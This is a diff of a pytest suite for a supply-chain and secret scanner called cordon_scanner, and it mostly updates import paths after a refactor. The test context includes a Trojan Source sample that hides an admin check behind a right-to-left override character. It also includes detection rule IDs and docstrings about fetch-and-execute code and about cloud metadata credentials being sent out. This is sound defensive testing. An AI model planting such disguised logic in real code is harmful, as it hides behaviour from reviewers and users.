@@ -17,6 +17,9 @@ import pytest
 
 from cordon_scanner import Scanner
 from cordon_scanner.detect.binary.binary import BinaryDetector
+from cordon_scanner.detect.code.capability.build_output import BuildOutput
+from cordon_scanner.detect.code.capability.labelling import Labelling
+from cordon_scanner.detect.code.capability.text_position import TextPosition
 from cordon_scanner.detect.secrets.secrets import ASSIGNMENT, NOT_A_SECRET, SecretNames
 from cordon_scanner.foundation.models import Category, Severity
 from support import Support
@@ -369,11 +372,11 @@ class TestAnInstallHookInASubdirectory:
 
     @staticmethod
     def resolve(manifest: str, command: str) -> set[str]:
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.hooks import Hooks
         from cordon_scanner.foundation.models import Hook
 
         hook = Hook(kind="npm", path=manifest, name="postinstall", command=command)
-        return Engine._hook_script_paths(manifest, [hook], TestAnInstallHookInASubdirectory.KNOWN)
+        return Hooks.hook_script_paths(manifest, [hook], TestAnInstallHookInASubdirectory.KNOWN)
 
     @pytest.mark.parametrize(
         ("manifest", "command", "expected"),
@@ -396,12 +399,12 @@ class TestAnInstallHookInASubdirectory:
         import posixpath
         import unittest.mock
 
-        from cordon_scanner.engine import engine
+        from cordon_scanner.engine.pipeline import hooks
 
         # `ntpath` is what `os.path` *is* on Windows. Substituting it here
         # reproduces the Windows result on any host: if anything in the
         # resolution still reaches for the platform's own module, this fails.
-        with unittest.mock.patch.object(engine, "posixpath", posixpath):
+        with unittest.mock.patch.object(hooks, "posixpath", posixpath):
             assert self.resolve("package.json", "node scripts/setup.js") == {"scripts/setup.js"}
         assert ntpath.normpath("scripts/setup.js") == "scripts\\setup.js", (
             "the bug this guards against: the Windows normpath rewrites the separator"
@@ -628,14 +631,13 @@ class TestAPrintedCommandIsNotAnExecutedOne:
     def suppressed(source: str) -> bool:
         import re
 
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = source.encode()
         content = FileContent(path="Makefile", raw=raw, size=len(raw))
         match = re.search(rb"curl", raw)
         assert match is not None
-        return CapabilityDetector._is_printed_text(content, match.start(), match.end())
+        return TextPosition.is_printed_text(content, match.start(), match.end())
 
     @pytest.mark.parametrize(
         "source",
@@ -801,7 +803,7 @@ class TestOneCredentialIsOneFinding:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
@@ -817,7 +819,7 @@ class TestOneCredentialIsOneFinding:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
@@ -853,7 +855,7 @@ class TestWhereProjectsActuallyKeepTestMaterial:
         ],
     )
     def test_it_is_recognised(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -869,7 +871,7 @@ class TestWhereProjectsActuallyKeepTestMaterial:
         ],
     )
     def test_application_code_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -898,13 +900,13 @@ class TestACredentialInDocumentationIsUsuallyAFormat:
         ],
     )
     def test_it_is_recognised(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_documentation(path)
 
     @pytest.mark.parametrize("path", ["src/settings.py", "app/config.ts", "main.go"])
     def test_code_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_documentation(path)
 
@@ -914,7 +916,7 @@ class TestACredentialInDocumentationIsUsuallyAFormat:
             f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
@@ -1117,7 +1119,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
@@ -1135,7 +1137,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
@@ -1163,7 +1165,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             f"BIDI = [\n    '{chr(0x202E)}',  # right-to-left override\n]\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
@@ -1181,7 +1183,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
@@ -1329,7 +1331,7 @@ class TestWhereTheRestOfTheWorldKeepsItsFixtures:
         ],
     )
     def test_it_is_recognised(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -1337,7 +1339,7 @@ class TestWhereTheRestOfTheWorldKeepsItsFixtures:
         "path", ["vault/login_mfa.go", "src/auth/session.ts", "lib/credentials.rb"]
     )
     def test_application_code_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -1377,7 +1379,7 @@ class TestPublishingIsNotExfiltration:
         ],
     )
     def test_build_tooling_is_recognised(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_build_tooling(path)
 
@@ -1392,7 +1394,7 @@ class TestPublishingIsNotExfiltration:
         ],
     )
     def test_generated_output_is_recognised(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_generated_artefact(path)
 
@@ -1408,14 +1410,14 @@ class TestPublishingIsNotExfiltration:
         ],
     )
     def test_vendored_source_and_application_code_are_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_build_tooling(path)
         assert not SourcePaths.is_generated_artefact(path)
 
     def test_a_release_script_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         scripts = tmp_path / "scripts"
@@ -1435,7 +1437,7 @@ class TestPublishingIsNotExfiltration:
         """The ordering that keeps the ceiling safe: the install-hook escalation is
         applied after it, so code that runs unprompted is unaffected."""
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         scripts = tmp_path / "scripts"
@@ -1515,7 +1517,7 @@ checksum = "330a5ed07fa54e4702c9d6c4174f74427fc0ef6e214bbd677ae50a5099946470"
         appeared in that set whether the fix worked or not.
         """
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
         return {f.rule_id for f in result.findings}
@@ -1554,7 +1556,7 @@ class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
 
     def test_a_deliberately_broken_fixture_is_not_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         tests = tmp_path / "tests" / "files"
@@ -1567,7 +1569,7 @@ class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
 
     def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         assets = tmp_path / "static" / "img"
@@ -1707,7 +1709,7 @@ class TestDoingItCorrectlyIsNotTheSameAsDoingItCarelessly:
     @staticmethod
     def fetch_exec(root):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
         return [f for f in result.findings if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"]
@@ -1779,7 +1781,7 @@ class TestANameEndingInLocationHoldsALocation:
 
     @pytest.mark.parametrize("path", ["TESTING.asciidoc", "docs/guide.asciidoc", "NOTES.org"])
     def test_asciidoc_is_documentation(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_documentation(path)
 
@@ -1793,13 +1795,13 @@ class TestANameEndingInLocationHoldsALocation:
         ],
     )
     def test_a_publishing_script_is_build_tooling(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_build_tooling(path)
 
     @pytest.mark.parametrize("path", ["src/publisher.py", "lib/release_notes.rb"])
     def test_application_code_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_build_tooling(path)
 
@@ -1971,7 +1973,7 @@ class TestAGoCompositeLiteralIsNotACredential:
     def test_a_plural_helper_file_is_test_material(self, path: str) -> None:
         """`**/*_test_helper.*` was listed and the plural was not, which is the
         spelling Vault uses."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -2066,7 +2068,7 @@ class TestABinDirectoryIsWhereAProgramKeepsItself:
     @staticmethod
     def rules_in(root) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id
@@ -2116,13 +2118,13 @@ class TestPersistenceIsWhatAnInstallerDoes:
         ],
     )
     def test_an_installer_directory_is_build_tooling(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_build_tooling(path)
 
     @pytest.mark.parametrize("path", ["src/installers.py", "app/provision_account.rb"])
     def test_application_code_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_build_tooling(path)
 
@@ -2151,20 +2153,18 @@ class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
         return FileContent(path=path, raw=raw, size=len(raw))
 
     def test_a_hashed_bundle_is_recognised(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         bundle = "var a=1;" * 400
-        assert CapabilityDetector._is_minified(self.content("assets/index-BTLZFAP9.js", bundle))
+        assert BuildOutput.is_minified(self.content("assets/index-BTLZFAP9.js", bundle))
 
     def test_ordinary_source_is_not(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         source = "function add(a, b) {\n    return a + b;\n}\n" * 50
-        assert not CapabilityDetector._is_minified(self.content("src/math.js", source))
+        assert not BuildOutput.is_minified(self.content("src/math.js", source))
 
     def test_a_minified_bundle_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         assets = tmp_path / "assets"
@@ -2181,7 +2181,7 @@ class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
 
     def test_hand_written_source_doing_the_same_thing_still_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         source = tmp_path / "src"
@@ -2278,7 +2278,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
 
     def test_a_labelled_override_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         (tmp_path / "trojansource.py").write_text(
@@ -2296,7 +2296,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
 
     def test_a_bom_in_a_one_character_literal_is_a_parser(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         (tmp_path / "parse.js").write_text(
@@ -2313,7 +2313,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
         """The guard, and the reason neither of these is a suppression: an override that
         does not announce itself is the attack."""
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         source = tmp_path / "src"
@@ -2383,7 +2383,7 @@ class TestAGitLfsPointerIsNotAForgery:
 
     def test_the_skip_is_reported_once(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         static = tmp_path / "static"
@@ -2582,7 +2582,7 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
 
         The point of the ceiling is that these drop out of a default scan, so a test
         that wants to see them has to ask the way a curious reader would."""
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         config = Config.default().with_overrides(severity_threshold=Severity.INFO)
@@ -2719,10 +2719,9 @@ class TestTheMetadataEndpointIsNotTheNetwork:
         ],
     )
     def test_a_local_destination_is_not_egress(self, line: bytes) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
-        assert CapabilityDetector._is_local_target(content, content.raw.index(line))
+        assert TextPosition.is_local_target(content, content.raw.index(line))
 
     @pytest.mark.parametrize(
         "line",
@@ -2739,10 +2738,9 @@ class TestTheMetadataEndpointIsNotTheNetwork:
         still a fetch and is what this project's own malicious corpus uses; a real host;
         a destination held in a variable, which says nothing either way; and a metadata
         read piped straight to a collector, which is the attack."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
-        assert not CapabilityDetector._is_local_target(content, content.raw.index(line))
+        assert not TextPosition.is_local_target(content, content.raw.index(line))
 
     def test_metadata_credentials_posted_out_are_still_reported(self, tmp_path) -> None:
         """The guard that matters. Reading IMDS role credentials and sending them
@@ -3010,7 +3008,7 @@ class TestProvisioningAMachineIsNotAFoothold:
     )
 
     def test_the_predicate(self) -> None:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         assert SampleKinds.is_machine_provisioning(self.BOOTSTRAP)
         assert SampleKinds.is_machine_provisioning(b"#cloud-config\npackages:\n  - curl\n")
@@ -3219,9 +3217,8 @@ class TestARegexMatchIsNotAProcess:
     @staticmethod
     def capability_lines(source: str, language: str, capability: str) -> set[int]:
         from cordon_scanner.detect.base import RuleSelector
-        from cordon_scanner.detect.code.capability import CapabilityDetector
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.foundation.content import FileContent
-        from cordon_scanner.foundation.models import Capability
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         raw = source.encode()
@@ -3231,7 +3228,7 @@ class TestARegexMatchIsNotAProcess:
         # Ruby and PHP and a pattern match in JavaScript, and the packs are allowed to
         # disagree about a spelling because only one of them runs on a given file.
         rules = RuleSet(RuleLoader.load_builtin())
-        hits = CapabilityDetector()._match_capabilities(
+        hits = Labelling.match_capabilities(
             content,
             RuleSelector.select_rules(rules, language=language, path=content.path),
             language,
@@ -3455,7 +3452,7 @@ class TestAReferenceIsNotAValue:
         """Twenty-eight keys under `x509/static/` -- a CA, an intermediate, a rollover
         pair, OCSP responders, PKCS#1 and PKCS#8 variants -- are a hierarchy built for
         an authentication test suite. gRPC's vendored `test_creds/` is thirteen more."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material("x509/static/intermediate_ca_key.pem")
         assert SourcePaths.is_test_material(
@@ -3548,12 +3545,12 @@ class TestTheSecondPassOverTheCorpus:
         ],
     )
     def test_a_generated_test_hierarchy_is_test_material(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
     def test_a_deployed_key_is_not(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material("deploy/production/server.key")
         assert not SourcePaths.is_test_material("config/tls/server.key")
@@ -3780,7 +3777,7 @@ class TestAWorkspaceMemberHasNothingToHash:
         """ASP.NET Core keeps eight keys under `src/Shared/TestCertificates/`, which
         the glob list missed because it had three spellings of `test-certs` and not the
         word written out."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material("src/Shared/TestCertificates/https-ecdsa.key")
         assert not SourcePaths.is_test_material("deploy/certs/server.key")
@@ -3810,7 +3807,7 @@ class TestAGradleSourceSetIsStillATestTree:
         ],
     )
     def test_these_are_test_material(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -3823,7 +3820,7 @@ class TestAGradleSourceSetIsStillATestTree:
         ],
     )
     def test_these_are_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -4172,7 +4169,7 @@ class TestTheLanguagesOwnPlaceForTests:
         assert {e.name for e in graph.entries if not e.local and not e.integrity} == {"Unhashed"}
 
     def test_keycloaks_test_pki_is_test_material(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(
             "testsuite/integration-arquillian/servers/auth-server/common/keystore/client-ca.key"
@@ -4599,12 +4596,11 @@ class TestACiScriptIsNotADropper:
         ],
     )
     def test_naming_a_tool_is_not_using_it(self, line: bytes, probe: bool) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = b"#!/bin/sh\n" + line + b"\n"
         content = FileContent(path="x.sh", raw=raw, size=len(raw))
-        assert CapabilityDetector._is_tool_probe(content, raw.index(line)) is probe
+        assert TextPosition.is_tool_probe(content, raw.index(line)) is probe
 
     @pytest.mark.parametrize(
         ("line", "local"),
@@ -4621,12 +4617,11 @@ class TestACiScriptIsNotADropper:
         just started, and the URL pattern needed a scheme to see it. The quoted form is
         vLLM's, where the port sits on the other side of a shell quote and the capture
         ends in a bare colon."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = b"#!/bin/sh\n" + line + b"\n"
         content = FileContent(path="x.sh", raw=raw, size=len(raw))
-        assert CapabilityDetector._is_local_target(content, raw.index(line)) is local
+        assert TextPosition.is_local_target(content, raw.index(line)) is local
 
     @pytest.mark.parametrize(
         ("line", "reported"),
@@ -4667,7 +4662,7 @@ class TestATranslationIsNotACredential:
         ],
     )
     def test_a_catalogue_is_documentation(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_documentation(path)
 
@@ -4680,7 +4675,7 @@ class TestATranslationIsNotACredential:
         ],
     )
     def test_configuration_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_documentation(path)
 
@@ -4772,7 +4767,7 @@ class TestVendoredCodeIsSomebodyElsesSource:
         ],
     )
     def test_these_are_vendored(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_vendored(path)
 
@@ -4785,7 +4780,7 @@ class TestVendoredCodeIsSomebodyElsesSource:
         ],
     )
     def test_these_are_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_vendored(path)
 
@@ -4838,13 +4833,12 @@ class TestDefiningANameIsNotUsingIt:
 
     @staticmethod
     def declared(line: bytes, needle: bytes) -> bool:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = b"// file\n" + line + b"\n"
         content = FileContent(path="x.ts", raw=raw, size=len(raw))
         start = raw.index(needle)
-        return CapabilityDetector._is_declaration(content, start, start + len(needle))
+        return TextPosition.is_declaration(content, start, start + len(needle))
 
     @pytest.mark.parametrize(
         ("line", "needle"),
@@ -5879,7 +5873,7 @@ class TestAProjectNamesItsOwnTestTree:
         ],
     )
     def test_which_directories_hold_test_material(self, path: str, expected: bool) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path) is expected
 
@@ -7229,7 +7223,7 @@ class TestAPemBlockTooSmallToBeAKey:
         `__mockdata__/src/__screenshots__/`, which no `__mocks__` or `__snapshots__` glob
         can see. Every project invents its own dunder directory and none of them is
         product source."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(
             "code/core/__mockdata__/src/__screenshots__/Primary.png"
@@ -7251,7 +7245,7 @@ class TestAOneLinerThatOnlyTalks:
     so being the project's own manifest did not help.
 
     The engine already draws this distinction for hook PATHS: `PRINTING_COMMANDS` and
-    `Engine._runs` strip printer segments before resolving what a lifecycle script
+    `Hooks.runs` strip printer segments before resolving what a lifecycle script
     reaches. The manifest detector had no equivalent for the program inside a `-e`.
 
     Still reported, through the branch that says a script runs at install time and is not
@@ -7529,7 +7523,7 @@ class TestTestHelpersLiveBesideTheLibrary:
         "name", ["testing_utils.py", "conftest.py", "test-helpers.ts", "utils.tests.js"]
     )
     def test_the_filename_is_the_statement(self, name: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.names_test_file(f"src/transformers/{name}")
 
@@ -7537,7 +7531,7 @@ class TestTestHelpersLiveBesideTheLibrary:
     def test_a_word_that_merely_contains_test_is_not(self, name: str) -> None:
         """The control that cost the most to get right: `latest.py` and `manifest.py` are
         ordinary modules, and a substring test would have excused both."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.names_test_file(f"src/cordon_scanner/{name}")
 
@@ -7743,7 +7737,7 @@ class TestAHostIsNotASubstring:
 
     @staticmethod
     def _hit(raw: bytes) -> str | None:
-        from cordon_scanner.intel.malware.hosts import Destinations
+        from cordon_scanner.analysis.shared.destinations import Destinations
 
         found = Destinations.destination_matcher().search(raw)
         return found.group(0).decode() if found else None
@@ -7791,7 +7785,7 @@ class TestAPlatformApiIsNotAWebhookIngest:
 
     @staticmethod
     def _hit(raw: bytes) -> str | None:
-        from cordon_scanner.intel.malware.hosts import Destinations
+        from cordon_scanner.analysis.shared.destinations import Destinations
 
         found = Destinations.destination_matcher().search(raw)
         return found.group(0).decode() if found else None
@@ -7975,7 +7969,7 @@ class TestSixNamesAreNotAComputedName:
     @staticmethod
     def _dispatch(source: str) -> list:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             h for h in PythonAnalyzer.analyse(source) if h.capability is Capability.DYNAMIC_DISPATCH
@@ -8299,7 +8293,7 @@ class TestTheNamesAFileGivesItsOwnFixtures:
         ],
     )
     def test_each_is_material_written_for_a_test(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -8309,7 +8303,7 @@ class TestTheNamesAFileGivesItsOwnFixtures:
         `TestHowMuchOfARepositoryThePathPredicatesExcuse` found the same word claiming 39
         Django data migrations in a real repository. `seed` now means something only on a
         key or configuration file, which is what it was added for."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material("db/seed_data.rb")
         assert not SourcePaths.is_test_material("db/seeds.rb")
@@ -8317,7 +8311,7 @@ class TestTheNamesAFileGivesItsOwnFixtures:
 
     @pytest.mark.parametrize("path", ["rclone.1", "man/man8/mount.8"])
     def test_a_man_page_is_documentation(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_documentation(path)
 
@@ -8334,7 +8328,7 @@ class TestTheNamesAFileGivesItsOwnFixtures:
         ],
     )
     def test_the_ordinary_spelling_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
         assert not SourcePaths.is_documentation(path)
@@ -8464,7 +8458,7 @@ class TestInstallingSoftwareIsWhatAnInstallerDoes:
 
     @staticmethod
     def _provisioning(text: str, path: str = "x.sh") -> bool:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         return SampleKinds.is_machine_provisioning(text.encode(), path)
 
@@ -8529,7 +8523,7 @@ class TestTheNamesADirectoryGivesItsDemoKeys:
         ],
     )
     def test_the_compound_name_is_read(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -8538,7 +8532,7 @@ class TestTheNamesADirectoryGivesItsDemoKeys:
     )
     def test_a_key_in_an_ordinary_place_still_reports(self, path: str) -> None:
         """The control: three real committed keys from the same corpus sample."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -8591,12 +8585,11 @@ class TestAnImportBringsANameIntoScope:
 
     @staticmethod
     def _is_declaration(line: str, needle: str) -> bool:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         content = FileContent.from_bytes("x.rs", line.encode())
         offset = line.index(needle)
-        return CapabilityDetector._is_declaration(content, offset, offset + len(needle))
+        return TextPosition.is_declaration(content, offset, offset + len(needle))
 
     @pytest.mark.parametrize(
         ("line", "needle"),
@@ -8626,11 +8619,10 @@ class TestAHostWrittenAsAQuotedString:
 
     @staticmethod
     def _local(line: str) -> bool:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         content = FileContent.from_bytes("x.rs", line.encode())
-        return CapabilityDetector._is_local_target(content, 4)
